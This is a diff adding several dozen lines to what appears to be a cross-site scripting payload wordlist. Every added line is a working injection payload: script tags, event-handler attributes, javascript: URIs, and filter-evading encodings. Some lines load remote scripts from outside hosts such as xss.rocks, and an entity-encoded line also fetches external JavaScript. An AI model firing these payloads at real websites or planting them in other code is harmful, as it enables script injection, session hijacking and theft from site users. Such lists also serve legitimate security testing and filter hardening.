@@ -2247,3 +2247,76 @@ http://www.<script>alert(1)</script .com
 <object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>
 <iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
 <a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>
+<script>alert(1)</script>
+<script>alert('1')</script>
+<script>alert(`1`)</script> 
+<script>alert("1")</script>
+<img src =x onerror=prompt[1]>
+<img src =x onerror=prompt['1']>
+<img src =x onerror=prompt["1"]>
+<img src =x onerror=prompt[`1`]>
+<img src =x onerror=prompt(1)>
+<img src =x onerror=prompt('1')>
+<img src =x onerror=prompt("1")>
+<img src =x onerror=prompt(`1`)>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG SRC=javascript:alert("XSS")>
+<IMG SRC=`javascript:alert("TEST, 'XSS'")`>
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+<IMG SRC=" &#14;  javascript:alert('XSS');">
+<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+<IMG SRC="javascript:alert('XSS')"
+ </script><script>alert('XSS');</script>
+</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+<BODY BACKGROUND="javascript:alert('XSS')">
+<IMG DYNSRC="javascript:alert('XSS')">
+<IMG LOWSRC="javascript:alert('XSS')">
+<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
+<IMG SRC='vbscript:msgbox("XSS")'>
+<IMG SRC="livescript:[code]">
+<svg/onload=alert('XSS')>
+<svg/onload=alert('XSS')>
+<BODY ONLOAD=alert('XSS')>
+<BR SIZE="&{alert('XSS')}">
+<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+<TABLE BACKGROUND="javascript:alert('XSS')">
+<TABLE><TD BACKGROUND="javascript:alert('XSS')">
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+ <DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
+"><h1><script>alert("MESSAGE")</script>123</h1>
+"></iframe><script>alert(`TEXT YOU WANT TO BE DISPLAYED`);</script>
+"><h1><IMG SRC="javascript:alert('XSS');"></h1>
+"><h1><IMG SRC="jav&#x09;ascript:alert('XSS');"></h1>
+"><h1><IFRAME SRC="javascript:alert('XSS');"></IFRAME>">123</h1>
+"><h1><STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>"></h1>
+<body onload=alert('test1')>
+<IMG SRC=j&#X41vascript:alert('test2')>
+<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+<form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>
+<video poster=javascript:alert(1)//></video>
+<form id=test onforminput=alert(1)><input></form><button form=test onformchange=alert(2)>X</button>
+<video><source onerror="alert(1)">
+<video onerror="alert(1)"><source></source></video>
+<form><button formaction="javascript:alert(1)">X</button>
+<body oninput=alert(1)><input autofocus>
+<iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;" />
+<picture><source srcset="x"><img onerror="alert(1)"></picture>
+<picture><img srcset="x" onerror="alert(1)"></picture>
+<img srcset=",,,,,x" onerror="alert(1)">
+<details open ontoggle="alert(1)">
+<video src onratechange="alert(1)">
+<frameset onload=alert(1)>
